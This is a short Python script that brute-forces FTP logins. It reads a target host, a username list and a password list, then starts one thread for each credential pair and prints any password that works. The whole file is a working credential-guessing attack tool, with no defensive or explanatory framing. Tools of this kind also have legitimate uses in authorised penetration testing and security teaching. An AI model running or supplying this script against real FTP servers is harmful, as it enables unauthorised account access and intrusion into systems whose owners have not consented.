import ftplib
import threading

def attempt_ftp_login(host, username, password):
    try:
        ftp = ftplib.FTP(host, username, password)
        print("[+] {0:*^50}".format(" Password Found !!! "))
        print("[+] Password - {0}".format(password))
        print("[+] {0:*^50}".format(""))
    except:
        print("[-] Password Trying - {0}".format(password))

def main():
    host = input("Enter the HOST ADDRESS/IP: ")
    userfile = input("Enter the HOST USERNAME: ")
    password_file = input("Password file path: ")

    usernames = [line.strip() for line in open(userfile, "r")]
    passwords = [line.strip() for line in open(password_file, "r")]

    for username in usernames:
        for password in passwords:
            t = threading.Thread(target=attempt_ftp_login, args=(host, username, password))
            t.start()

if __name__ == "__main__":
    main()

